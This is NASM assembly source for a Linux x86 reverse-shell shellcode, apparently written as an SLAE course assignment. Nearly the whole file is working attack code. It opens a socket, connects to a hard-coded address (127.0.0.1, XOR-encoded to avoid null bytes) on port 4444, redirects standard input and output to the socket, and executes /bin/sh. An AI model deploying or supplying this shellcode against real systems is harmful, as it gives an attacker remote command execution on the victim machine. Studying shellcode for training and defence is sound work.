; Filename: 	tcp_reverse_shellcode.nasm
; Author:	    Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Blog post:  https://codiceinsicuro.it/slae/assignment-2-create-a-reverse-shellcode/
; Twitter:   	@thesp0nge
; SLAE-ID:    1217
; Purpose:	  connect to a given IP and PORT and spawning a reverse shell if
;             connection succeded 


global _start			

section .text

_start:

	; Creating the socket.
	; 
	; int socket(int domain, int type, int protocol);
	; 
	; socket() is defined as #define __NR_socket 359 on /usr/include/i386-linux-gnu/asm/unistd_32.h
	; AF_INET is defined as 2 in /usr/include/i386-linux-gnu/bits/socket.h
	; SOCK_STREAM is defined as 1 in /usr/include/i386-linux-gnu/bits/socket_type.h
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	mov ax, 0x167
	mov bl, 0x2
	mov cl, 0x1
	int 0x80 ; sfd = socket(AF_INET, SOCK_STREAM, 0);
	mov ebx, eax ; storing the socket descriptor into EBX for next syscall

	; Connect to my peer
	; 
	; connect() is defined as #define __NR_connect 362 on  /usr/include/i386-linux-gnu/asm/unistd_32.h
	; peer.sin_family 	= AF_INET;
	; peer.sin_port 	= htons(DPORT); 
	; peer.sin_addr.s_addr = inet_addr(IP); 
	; ret = connect(sfd, (const struct sockaddr *)&peer, sizeof(struct sockaddr_in));

	; 127 = 0x7f
	; 0   = 0x0 
	; 0   = 0x0 
	; 1   = 0x1

	; push 0x0100007f
	mov eax, 0xfeffff80
	xor eax, 0xffffffff
	push eax
	push word 0x5c11 	; port 4444 is 0x5c11
	push word 0x2 		; AF_INET is 2
	

	mov ecx, esp
	mov dl, 0x10 ; sizeof(struct sockaddr_in)
	xor eax, eax
	mov ax, 0x16a
	int 0x80 

	test eax, eax ; check if eax is zero
	jnz exit_on_error
		

	; Duplicating descriptor 0, 1, 2 to the socket opened by client
	;
	; int dup2(int oldfd, int newfd);
	; 
	; dup2 is defined as #define __NR_dup2 63 in /usr/include/i386-linux-gnu/asm/unistd_32.h

	xor ecx, ecx
	mov cl,  2
	xor eax, eax

dup2:
	mov al, 0x3F	; 63 in decimal
	int 0x80	; duplicating file descriptors in backwards order; from 2 to 0
	dec ecx 
	jns dup2

	; Executing shell
	; 
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h

	xor eax, eax
	push eax	; The NULL byte
	push 0x68732f2f ; "sh//". The second '\' is used to align our command into the stack
	push 0x6e69622f ; "nib/"
	mov ebx, esp	; EBX now points to "/bin//sh"
	
	xor ecx, ecx
	xor edx, edx
	mov al, 0xB	; 11 in decimal
	int 0x80

exit_on_error:
	mov bl, 0x1	
	xor eax, eax	; zero-ing EAX
	mov al, 0x1
	int 0x80
